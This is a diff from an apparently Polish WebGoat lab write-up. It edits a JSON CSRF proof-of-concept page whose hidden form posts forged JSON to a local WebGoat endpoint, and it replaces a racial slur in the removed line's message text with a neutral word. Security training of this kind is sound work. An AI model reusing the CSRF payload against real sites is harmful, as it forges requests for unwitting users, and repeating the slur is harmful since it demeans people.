@@ -78,7 +78,7 @@ Po uruchomieniu tego kodu powiniśmy otrzymać status, że zadanie zostało wyko
 	<center> 
 	<h1>JSON CSRF POC </h1>
 	<form action=http://localhost:{NUMER_PORTU}/WebGoat/csrf/feedback/message method=post enctype ="application/json">
-	<input name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"Webgoat nigger","ignore_me":"'value = 'test"}' type=hidden>
+	<input name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"Webgoat tekst","ignore_me":"'value = 'test"}' type=hidden>
 	<input type=submit value="Submit">
 	</form>
 	</center>
